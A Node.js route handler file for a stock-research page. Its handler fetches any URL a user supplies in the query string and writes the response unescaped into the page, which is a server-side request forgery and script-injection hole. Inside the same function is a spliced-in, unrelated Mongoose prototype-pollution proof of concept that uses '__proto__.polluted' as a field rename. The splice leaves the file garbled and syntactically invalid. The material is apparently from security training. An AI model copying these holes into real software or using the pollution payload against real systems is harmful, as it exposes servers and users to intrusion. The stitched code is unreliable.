const ResearchDAO = require("../data/research-dao").ResearchDAO;
const needle = require("needle");
const {
    environmentalScripts
} = require("../../config/config");

function ResearchHandler(db) {
    "use strict";

    const researchDAO = new ResearchDAO(db);

    this.displayResearch = (req, res) => {

        if (req.query.symbol) {
            const url = req.query.url + req.query.symbol;
            return needle.get(url, (error, newResponse, body) => {
                if (!error && newResponse.statusCode === 200) {
                    res.writeHead(200, {
                        "Content-Type": "text/html"
                    });
                }
                res.write("<h1>The following is the stock information you requested.</h1>\n\n");
                res.write("\n\n");
                if (body) {
                    res.write(body);
                }
                return res.end();
            });
        }

        return res.render("research", {
            environmentalScripts
        });
    };

    import { connect, model, Schema } from '@seal-security/mongoose-fixed';

    await connect('mongodb://127.0.0.1:27017/exploit');
    
    const Example = model('Example', new Schema({ hello: String }));
    
    const example = await new Example({ hello: 'world!' }).save();
    await Example.findByIdAndUpdate(example._id, {
        $rename: {
            hello: '__proto__.polluted'
        }
    });
    
    // this is what causes the pollution
    await Example.find();
    
    const test = {};
    console.log(test.polluted); // world!
    console.log(Object.prototype); // [Object: null prototype] { polluted: 'world!' }
    
    process.exit();

}

module.exports = ResearchHandler;
